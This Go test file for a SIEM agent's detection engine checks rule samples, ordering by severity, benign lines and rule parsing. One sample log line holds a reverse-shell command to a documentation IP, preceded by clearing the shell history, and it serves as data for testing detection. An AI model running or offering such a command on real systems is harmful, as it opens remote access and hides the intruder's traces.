package detection

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/chverma/siemagent/internal/models"
	"github.com/chverma/siemagent/internal/parser"
)

func builtinEngine(t *testing.T) *Engine {
	t.Helper()
	rules, errs := LoadBuiltin()
	if len(errs) > 0 {
		t.Fatalf("built-in rules failed to load: %v", errs)
	}
	e, errs := NewEngine(rules)
	if len(errs) > 0 {
		t.Fatalf("built-in rules conflict: %v", errs)
	}
	return e
}

// parse runs a raw line through the real log parser, as ingestion does.
func parse(line string) models.LogEvent {
	p := parser.New()
	if evs := p.ParseLine(line); len(evs) > 0 {
		return evs[0]
	}
	return p.ParseRaw(line)
}

func matchedIDs(dets []models.Detection) []string {
	ids := make([]string, len(dets))
	for i, d := range dets {
		ids[i] = d.RuleID
	}
	return ids
}

// TestBuiltinRuleSamples is detection-as-code: every shipped rule must carry
// samples, fire on each "match" line and stay silent on each "no_match" line.
func TestBuiltinRuleSamples(t *testing.T) {
	e := builtinEngine(t)
	if len(e.Rules()) < 10 {
		t.Fatalf("expected the full built-in pack, got %d rules", len(e.Rules()))
	}
	for _, r := range e.Rules() {
		t.Run(r.Title, func(t *testing.T) {
			if len(r.Samples.Match) == 0 || len(r.Samples.NoMatch) == 0 {
				t.Fatal("rule needs at least one match and one no_match sample")
			}
			if r.Description == "" || r.Remediation == "" || len(r.Tags) == 0 {
				t.Fatal("rule needs description, remediation and ATT&CK tags")
			}
			if r.IsThreshold() {
				// Threshold samples are sequences: the match lines together
				// must cross the threshold, the no_match lines must not.
				if !replayFires(r, r.Samples.Match) {
					t.Errorf("match samples should cross %s", r.Threshold())
				}
				if replayFires(r, r.Samples.NoMatch) {
					t.Errorf("no_match samples should stay under %s", r.Threshold())
				}
				return
			}
			for _, line := range r.Samples.Match {
				if !r.matches(eventFields(parse(line))) {
					t.Errorf("should match: %s", line)
				}
			}
			for _, line := range r.Samples.NoMatch {
				if r.matches(eventFields(parse(line))) {
					t.Errorf("should not match: %s", line)
				}
			}
		})
	}
}

// replayFires feeds lines to a threshold rule, one second apart, from a
// clean state and reports whether it fired.
func replayFires(r *Rule, lines []string) bool {
	r.agg.reset()
	defer r.agg.reset()
	at := time.Date(2026, 10, 3, 10, 0, 0, 0, time.UTC)
	for i, line := range lines {
		f := eventFields(parse(line))
		if !r.matches(f) {
			continue
		}
		if _, fired := r.agg.observe(f, at.Add(time.Duration(i)*time.Second)); fired {
			return true
		}
	}
	return false
}

func TestMatchOrdersBySeverity(t *testing.T) {
	e := builtinEngine(t)
	// Matches both the low SSH failure rule... and nothing else; then a line
	// that matches a critical and a high rule together.
	dets := e.Match(parse("Oct 11 22:21:00 web01 bash[1]: history -c; bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"))
	if len(dets) < 2 {
		t.Fatalf("expected two matches, got %v", matchedIDs(dets))
	}
	if dets[0].Level != "critical" || dets[1].Level != "high" {
		t.Fatalf("matches not ordered by severity: %+v", dets)
	}
	if hits := e.byID[dets[0].RuleID].Hits(); hits < 1 {
		t.Fatalf("hit counter not incremented: %d", hits)
	}
}

func TestBenignEventsDoNotMatch(t *testing.T) {
	e := builtinEngine(t)
	for _, line := range []string{
		"<34>1 2026-10-03T10:36:00Z cron01 CRON 1111 - (root) CMD (/usr/local/bin/backup.sh)",
		"Oct 11 22:14:15 web01 sshd[4721]: Accepted publickey for deploy from 10.0.0.2 port 51122 ssh2",
		`{"level":"info","msg":"user logged in","user":"alice"}`,
	} {
		if dets := e.Match(parse(line)); len(dets) > 0 {
			t.Errorf("benign line matched %v: %s", matchedIDs(dets), line)
		}
	}
}

func TestParseRulesReportsBadRulesAndKeepsGoodOnes(t *testing.T) {
	data := `
title: Good
id: good-1
detection:
  sel: {message|contains: evil}
  condition: sel
---
title: Aggregation
id: agg-1
detection:
  sel: {message: x}
  condition: sel | max(bytes) by src_ip > 5
---
title: Bad modifier
id: bad-1
detection:
  sel: {message|base64offset: x}
  condition: sel
---
title: Undefined selection
id: bad-2
detection:
  sel: {message: x}
  condition: other
---
title: No id
detection:
  sel: {message: x}
  condition: sel
`
	rules, errs := ParseRules([]byte(data), "test.yml")
	if len(rules) != 1 || rules[0].ID != "good-1" {
		t.Fatalf("want only the good rule, got %d", len(rules))
	}
	if len(errs) != 4 {
		t.Fatalf("want 4 errors, got %d: %v", len(errs), errs)
	}
	if !errors.Is(errs[0], ErrUnsupported) {
		t.Errorf("max() aggregation should be ErrUnsupported: %v", errs[0])
	}
	for _, want := range []string{"base64offset", "undefined selection", "missing id"} {
		found := false
		for _, e := range errs {
			found = found || strings.Contains(e.Error(), want)
		}
		if !found {
			t.Errorf("no error mentions %q: %v", want, errs)
		}
	}
}

func TestDuplicateRuleIDsAreSkipped(t *testing.T) {
	a, _ := ParseRules([]byte("title: A\nid: same\ndetection: {s: {message: a}, condition: s}"), "a.yml")
	b, _ := ParseRules([]byte("title: B\nid: same\ndetection: {s: {message: b}, condition: s}"), "b.yml")
	e, errs := NewEngine(append(a, b...))
	if len(e.Rules()) != 1 || len(errs) != 1 || e.Rules()[0].Title != "A" {
		t.Fatalf("first rule should win: rules=%d errs=%v", len(e.Rules()), errs)
	}
}

func TestLoadDir(t *testing.T) {
	dir := t.TempDir()
	write := func(name, body string) {
		if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("team/custom.yaml", "title: Custom\nid: c-1\nlevel: high\ndetection: {s: {message|contains: payroll.xlsx}, condition: s}")
	write("README.md", "not a rule")
	write("broken.yml", "title: [unclosed")

	rules, errs := LoadDir(dir)
	if len(rules) != 1 || rules[0].Source != filepath.Join(dir, "team/custom.yaml") {
		t.Fatalf("want the custom rule with its path as source, got %+v", rules)
	}
	if len(errs) != 1 {
		t.Fatalf("want one error for broken.yml, got %v", errs)
	}
}
